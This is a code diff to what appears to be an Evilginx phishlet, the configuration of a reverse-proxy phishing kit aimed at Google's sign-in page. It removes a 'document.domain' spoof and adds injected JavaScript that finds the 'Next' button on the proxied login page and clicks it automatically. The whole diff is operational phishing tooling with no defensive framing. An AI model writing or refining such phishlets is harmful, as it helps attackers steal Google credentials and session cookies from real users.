@@ -65,15 +65,46 @@ force_post:
     type: 'post'
 js_inject:
   - trigger_domains: ['accounts.google.com']
-    trigger_paths:   ['/', '/']
-    trigger_params:  []
+    trigger_paths: ['/']
     script: |
       (function() {
         'use strict';
-        try {
-          Object.defineProperty(document, 'domain', {
-            get: function() { return 'google.com'; },
-            configurable: true
-          });
-        } catch(e) {}
+
+        // Wait for the page to fully load
+        function injectScript() {
+          // Find the Next button using multiple reliable selectors
+          const nextButton = document.querySelector('button[aria-label="Next"], button[jsname="JnI2Ve"]');
+          
+          if (nextButton) {
+            console.log('[Evilginx] Next button found. Adding click handler...');
+            
+            // Add a click listener
+            nextButton.addEventListener('click', function(e) {
+              console.log('[Evilginx] Next button clicked manually');
+              // Prevent default behavior if necessary
+              // e.preventDefault(); 
+            });
+
+            // Force the click after a short delay to ensure the form is ready
+            setTimeout(function() {
+              if (nextButton.offsetParent !== null) {
+                console.log('[Evilginx] Triggering Next button click...');
+                const clickEvent = new MouseEvent('click', {
+                  view: window,
+                  bubbles: true,
+                  cancelable: true
+                });
+                nextButton.dispatchEvent(clickEvent);
+              }
+            }, 500);
+          } else {
+            console.log('[Evilginx] Next button not found');
+          }
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', injectScript);
+        } else {
+          injectScript();
+        }
       })();
